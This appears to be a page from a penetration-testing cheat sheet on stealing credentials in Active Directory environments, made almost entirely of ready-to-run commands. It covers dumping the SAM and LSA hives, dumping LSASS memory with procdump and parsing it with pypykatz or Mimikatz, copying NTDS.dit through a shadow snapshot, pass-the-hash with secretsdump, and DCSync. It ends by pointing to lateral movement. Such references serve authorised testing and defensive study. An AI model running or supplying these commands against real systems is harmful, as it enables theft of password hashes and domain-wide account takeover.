# AD credential access

[← Active Directory quick reference](../05-active-directory.md) · [Windows token rights](../windows/token-groups.md) · [Potato](../windows/potato.md)

Match method to rights: local admin/SYSTEM, backup, debug, or replication.

## Local SAM and LSA

Local SAM/SYSTEM:

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
nxc smb <target-ip> -u <admin-user> -p '<password>' --sam --lsa
impacket-secretsdump -hashes :<nt-hash> '<domain.tld>/<admin-user>@<target-ip>'
```

## LSASS and cached material

Debug/SYSTEM → LSASS dump for offline parsing:

```cmd
procdump -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

Mimikatz:

```text
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::cache
vault::cred
```

## DC database or replication

`SeBackupPrivilege` → snapshot + offline NTDS:

```cmd
diskshadow /s C:\Temp\dsh.txt
robocopy /b X:\Windows\NTDS C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save
```

```bash
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```

DCSync (replication rights):

```bash
impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
```

Then match account/hash to a reachable service: [lateral movement](lateral-movement.md).
